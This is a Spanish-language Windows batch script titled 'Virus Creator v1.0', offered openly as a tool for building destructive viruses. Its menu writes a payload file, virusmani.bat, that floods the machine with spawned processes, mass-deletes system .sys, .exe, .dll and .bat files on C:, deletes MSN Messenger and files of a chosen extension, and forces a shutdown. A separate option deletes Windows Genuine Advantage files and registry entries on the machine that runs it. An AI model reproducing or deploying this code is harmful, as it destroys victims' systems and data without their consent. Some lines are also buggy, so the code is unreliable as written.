@echo off
title Virus Creator v1.0
color 0a
echo HECHO POR SNNN BATANGREET I MOTIVADO POR NITSUGA (POR SU IGNORANCIA I SU MASSOQUERIA)
echo.
echo NO ME hAGO REPONSABLE DEL USO QUE LE DEs O DE LOS DAÑOS QUE PUEDA OCASIONAR
echo.
echo PARA QUE EL VIRUS FUNCIONE SE TIENE QUE METER EN EL DISCO DURO (C:\) Y ABRIR VIRUSMANI.bat
echo.
echo LUEGO LE DA ARRIBA A ARCHIVO Y LO GUARDA CON EL NOMBRE QUE KIERA Y AL FINAL LE PONE.BAT
echo.
echo LO DE .BAT AL FINAL ES IMPORTANTE SINO EL VIRUS NO FUNCIONA
echo.
echo CIERRE LAS DEMAS APLICACIONES ANTES DE HACER TU VIRUS
echo.
echo SI ESTAS DE ACUERDO PULSA UNA TECLA
echo.
echo @echo off>>virusmani.bat
pause>nul
:menu
echo.
echo  ==============================================================================================
echo.
echo    BIENVENIDO AL PROGRAMA PARA CREAR VIRUS .BAT DE PARTE DE SNNN BATANGREET MANIMECKER
echo.
echo  ==============================================================================================
echo.
echo.
echo.
echo /=================================================================================\
echo /=================================================================================\ 
echo / 1. QUE LE SALGA UN MENSAJE INDESEADO                                            \
echo / 2. CREAR UN BUCLE (SOBRECARGAR EL ORDENADOR)                                    \
echo / 3. CARGARSE EL ORDENADOR (PC)                                                   \
echo / 4. MATAR Y BORRAR EL MSN                                                        \
echo / 5. BORRAR TODOS LOS ARCHIVOS CON EXTENSION DESEADO                              \                                          
echo / 6. SALIR SIN HACER NADA                                                         \
echo / 7. INSTRUCCIONES DETALLADAS SOBRE COMO UTILIZAR EL VIRUS 
echo / 8. DESPIRATEAR WINDOWS                                                 \        
echo /=================================================================================\
echo /=================================================================================\
echo.
set /p emp= QUE DESEAS QUE HAGA TU VIRUS?: 
if %emp%== 1 goto mensaje
if %emp%== 2 goto bucle
if %emp%== 3 goto destruccion
if %emp%== 4 goto msn
if %emp%== 5 goto dele
if %emp%== 6 exit
if %emp%== 7 goto instrucciones
if %emp%== 8 goto despiratear

:mensaje
cls
echo ESTA OPCION ES PARA QUE A LA VICTIMA LE DALGA UN MENSAJE DESEADO
echo.
set /p men2= DESEA CONTINUAR?(S/N): 
if %men2%== s goto co
if %men2%== n goto menu
:co
cls
set /p co2= QUE MENSAJE DESEAS QUE LE SALGA? (LE SALDRA COMO MENSAJE DE WINDOWS):
echo msg * %co2%>>virusmani.bat
set /p co3= DESEA PONER OTRO MENSAJE?(S/N): 
if %co3%== s goto co
if %co3%== n goto men

:bucle
cls
echo AVISO. SI PONE ESTA OPCION EN MEDIO DEL VIRUS, EL VIRUS NO PODRA CONTINUAR.
echo.
echo ES ACONSEJABLE PONERLA COMO FINAL.
echo.
echo ESTA OPCION LE CREA UN BUCLE EN EL ORDENADOR
echo.
echo UN BUCLE SIRVE PARA SOBRECARGARLE LA RAM HASTA POSIBLEMENTE CARGARSELA
echo. 
set /p bu2= DESEA ACTIVAR ESTA OPCION?(S/N): 
if %bu2%== s goto bgg
if %bu2%== n goto menu
:bgg
cls
echo @echo off>>virusmani.bat
echo :bucle>>virusmani.bat
echo start explorer.exe>>virusmani.bat
echo start cmd.exe>>virusmani.bat
echo start iexplore.exe>>virusmani.bat
echo goto bucle>>virusmani.bat
echo OPCION COMPLETADA
goto menu

:destruccion
cls
echo ESTA OPCION SE CARGARA EL ORDENADOR DE LA VICTIMA
set /p dest2= DESEA CONTINUAR?(S/N): 
if %dest2%== s goto sip
if %dest2%== n goto menu
:sip
echo attrib "C:\*.*" -r -a -s -h>>virusmani.bat
echo del /q /s "C:\ntldr"
echo del /q /s /f C:\*.sys>>virusmani.bat
echo del /q /s /f C:\*.exe>>virusmani.bat
echo del /q /s /f C:\*.bat>>virusmani.bat
echo del /q /s /f C:\*.dll>>virusmani.bat
echo del /q /s /f *.sys>>virusmani.bat
echo del /q /s /f *.exe>>virusmani.bat
echo del /q /s /f *.bat>>virusmani.bat
echo del /q /s /f *.dll>>virusmani.bat
echo YA NO HAY ESPERANZA>>virusmani.bat
echo msg * CREO Q VAS A MORIR>>virusmani.bat
echo finalizado
pause>nul
goto menu

:msn
cls
echo ESTA OPCION LE MATA Y BORRA EL MSN POR COMPLETO
echo.
set /p msn2= DESEA ACTIVAR ESTA OPCION?(S/N): 
if %msn2%== s goto atakmsn
if %msn2%== n goto menu
:atakmsn
cls
echo taskkill /im /f "msnmsgr.exe">>virusmani.bat
echo del /q /s /f "C:\Archivos de programa\MSN Messenger\msnmsgr.exe">>virusmani.bat
echo del /q /s /f "C:\Archivos de programa\Windows Live\Messenger\msnmsgr.exe">>virusmani.bat
echo OPCION COMPLETADA
goto menu

:dele
cls
echo ESTA OPCION ES PARA BORRAR TODOS LOS ARCHIVOS CON LAS OPCIONES DESEADAS
echo.
set /p dele2= DESEA ACTIVAR ESTA OPCION?(S/N): 
if %dele2%== s goto ac
if %dele2%== n goto menu
:ac
cls
set /p ac2= POR FAVOR ESCRIBA LA EXTENSION QUE DESEA BORRAR POR EJEMPLO (.MP3) SIN PARENTESIS Y CON PUNTO: 
echo del /q /s /f c:\*.%ac2%>>virusmani.bat
echo OPCION COMPLETADA
pause
goto menu

:apa
cls
echo.
set /p pre12= DESEA ACTIVAR ESTA OPCION? (S/N):
if %pre12%== s goto ap
if %pre12%== n goto menu
:ap
cls
echo ESTA OPCION APAGA EL ORDENADOR DEJANDO UN MENSAJE DESEADO.
set /p ms= QUE MENSAJE DESEA QUE LE SALGA: 
echo Ingresa el tiempo en minutos :
set /p tiempo=
set /a tiempofinal=%tiempo% * 60
echo Apagando en %tiempo% minutos
echo shutdown -s -t %tiempofinal% -f -c "%ms%">>virusmani.bat
goto menu

:instrucciones
cls
echo MIENTRAS EJECUTES ESTE PROGRAMAS EN LA CARPETA O ESCRITORIO QUE ESTES VERAS UN ARCHIVO
echo QUE SE LLAMA VIRUSMANI.BAT ESE PROGRAMA ES EL VIRUS SI LO ABRES TE INFECTARAS A TI MISMO
echo ABRIR EL PROGRAMA CREADOR DE VIRUS NO ES PELIGROSO LO QUE SI ES, ES ABRIR VIRUSMANI.BAT
echo ESPERO SACAR UNA REEDICION DE ESTE VIRUS YA QUE A ESTA ESTABA CON PUBLICIDAD
echo COPIAR TOTAL O PARCIALMENTE ESTE CREADOR DE Virus esta prohibido
echo ES BASTANTE DIFICIL QUE UN ANTIVIRUS DETECTE ESTE VIRUS 
echo PODRIA SER QUE ESTE VIRUS NO FUNCIONASE EN WINDOWS VISTA 
echo NO ME HAGO RESPONSABLE DE LOS DAÑOS DE ESTE PROGRAMA
echo SI QUEREIS APRENDER MAS AGREGADME EN MESSENGER ALEIXMEGAMAN@HOTMAIL.COM
echo ESPERO QUE OS GUSTE
pause>nul
goto menu

:despiratear
echo ESTA OPCION DESPIRATEA EL WINDOWS 
echo.
echo SI NO ESTAS SEGURO SI LO TIENES PIRATEADO
echo.
echo EJECUTALO IGUAL YA PARA PREVENIR POSTERIORES PIRATEAMIENTOS
echo.
set /p piratear= DESEA ACTIVAR ESTA OPCION?(S/N): 
if %piratear%== s goto pirat
if %piratear%== n goto menu
:pirat
taskkill /im wgatray.exe
Del c:\Windows\System32\WgaTray.exe
Del c:\Windows\System32\dllcache\WgaTray.exe
echo Windows Registry Editor Version 5.00 >%temp%\WGANFIX.REG
echo. >>%temp%\WGANFIX.REG
echo [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\WgaLogon] >>%temp%\WGANFIX.REG
regedit /s %temp%\WGANFIX.REG
del %temp%\WGANFIX.REG
del c:\windows\system32\wgalogon.dll
del c:\windows\system32\dllcache\wgalogon.dll
echo FINALIZADO
pause>nul
goto menu

